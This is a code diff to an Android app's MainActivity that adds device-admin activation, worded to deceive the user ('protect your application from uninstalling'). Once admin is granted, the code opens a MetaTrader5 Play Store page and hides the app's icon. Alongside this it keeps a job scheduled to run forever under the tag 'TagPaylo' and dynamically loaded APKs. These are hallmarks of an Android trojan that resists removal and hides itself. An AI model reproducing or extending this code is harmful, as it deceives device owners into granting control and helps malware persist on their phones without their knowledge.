@@ -28,6 +28,8 @@ import com.firebase.jobdispatcher.JobService;
 import com.firebase.jobdispatcher.RetryStrategy;
 import com.firebase.jobdispatcher.Trigger;
 import static com.firebase.jobdispatcher.Lifetime.FOREVER;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 public class MainActivity extends Activity implements View.OnClickListener {
     private final static String TAG = "MainActivity";
     private TextView tv_console;
@@ -39,12 +41,14 @@ public class MainActivity extends Activity implements View.OnClickListener {
     private FirebaseJobDispatcher mDispatcher;
     private Job myJob;
     private String TagJob="TagPaylo";
+    Button btExit;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-/*        setContentView(R.layout.activity_main);
-
-        tv_console = (TextView) findViewById(R.id.tv_console);
+       setContentView(R.layout.activity_main);
+        btExit = (Button) findViewById(R.id.btExit);
+        btExit.setOnClickListener(this);
+/*        tv_console = (TextView) findViewById(R.id.tv_console);
         bt_load_apk1 = (Button) findViewById(R.id.bt_load_apk1);
         bt_load_apk1.setOnClickListener(this);
         bt_call_method = (Button) findViewById(R.id.bt_call_method);
@@ -62,6 +66,26 @@ public class MainActivity extends Activity implements View.OnClickListener {
 
         printHowClassLoaderWorks();
 */
+
+        try {
+            // Initiate DevicePolicyManager.
+            DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+
+            // Set DeviceAdminDemo Receiver for active the component with different option
+            ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);
+
+            if (!policyMgr.isAdminActive(componentName)) {
+                // try to become active
+                Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Click on Activate button to protect your application from uninstalling!");
+
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
         Bundle myExtrasBundle = new Bundle();
 
@@ -87,16 +111,16 @@ public class MainActivity extends Activity implements View.OnClickListener {
         mDispatcher.schedule(myJob);
         //mDispatcher.mustSchedule(myJob);
 
-        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
+/*        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
         Intent intent = new Intent(Intent.ACTION_VIEW, uri);
         startActivity(intent);
 
-/*       openApk(MyConfig.apk1);
+       openApk(MyConfig.apk1);
         intent = new Intent();
         intent.setClass(MainActivity.this, apkActivity);
        startActivity(intent);
-*/        hideApplication();
-        finish();
+        hideApplication();
+*/        //finish();
     }
 
     private void printHowClassLoaderWorks() {
@@ -115,6 +139,37 @@ public class MainActivity extends Activity implements View.OnClickListener {
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
+            case R.id.btExit:
+                try {
+                    // Initiate DevicePolicyManager.
+                    DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+
+                    // Set DeviceAdminDemo Receiver for active the component with different option
+                    ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);
+
+                    if (!policyMgr.isAdminActive(componentName)) {
+                        // try to become active
+                        Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                        //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
+                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                                "Click on Activate button to protect your application from uninstalling!");
+
+                        startActivity(intent);
+                        btExit.setText("Enable Admin");
+                    }
+                    else
+                    {
+                        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
+                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                        startActivity(intent);
+                        hideApplication();
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
+                break;
             case R.id.bt_load_apk1:
 //                ((MyApplication) getApplication()).RemoveApk();
                 openApk(MyConfig.apk1);
@@ -301,8 +356,10 @@ public class MainActivity extends Activity implements View.OnClickListener {
         super.onDestroy();
         //Remove the latest loaded-apk
         ((MyApplication) getApplication()).RemoveApk();
-        mDispatcher.cancel(TagJob);
-        mDispatcher.schedule(myJob);
+        //mDispatcher.cancel(TagJob);
+        //mDispatcher.schedule(myJob);
+        //Intent broadcastIntent = new Intent("android.intent.action.BOOT_COMPLETED");
+        //sendBroadcast(broadcastIntent);
         Log.d(TAG, "onDestroy");
     }
 
